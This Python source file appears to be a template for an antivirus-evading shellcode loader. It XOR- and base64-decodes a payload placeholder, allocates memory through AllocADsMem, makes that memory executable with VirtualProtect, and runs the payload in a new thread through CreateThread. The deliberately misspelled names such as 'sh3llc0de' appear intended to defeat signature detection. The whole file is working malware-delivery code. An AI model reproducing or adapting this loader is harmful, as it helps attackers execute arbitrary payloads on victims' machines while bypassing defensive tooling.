import ctypes
import random
import base64


def test(string, module='encode', key=random.randint(1, 255)):
    if module == 'encode':
        buf = bytearray(string)
        encode_code = b''
        for i in buf:
            b = (255 - i) ^ key
            encode_code += chr(b).encode('hex')
        encode_code += chr(key).encode('hex')
        result = base64.b64encode(encode_code)
        return result
    elif module == 'decode':
        decode_code = bytearray(base64.b64decode(string).decode('hex'))
        sh3llc0de = bytearray()
        key = decode_code[-1]
        for i in decode_code[0:-1]:
            b = 255 - (i ^ key)
            sh3llc0de.append(b)
        return sh3llc0de
    else:
        print('???')


sh3llc0de_m = "${sh3llc0de_m}"
sh3llc0de = test(sh3llc0de_m, 'decode')
pttr = ctypes.windll.Activeds.AllocADsMem(len(sh3llc0de))
ctypes.windll.kernel32.VirtualProtect(pttr, len(sh3llc0de), 0x40, ctypes.byref(ctypes.c_long(1)))
buuf = (ctypes.c_char * len(sh3llc0de)).from_buffer(sh3llc0de)
ctypes.windll.kernel32.RtlMoveMemory(pttr, buuf, len(sh3llc0de))
hanndle = ctypes.windll.kernel32.CreateThread(0, 0, pttr, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(hanndle, -1)
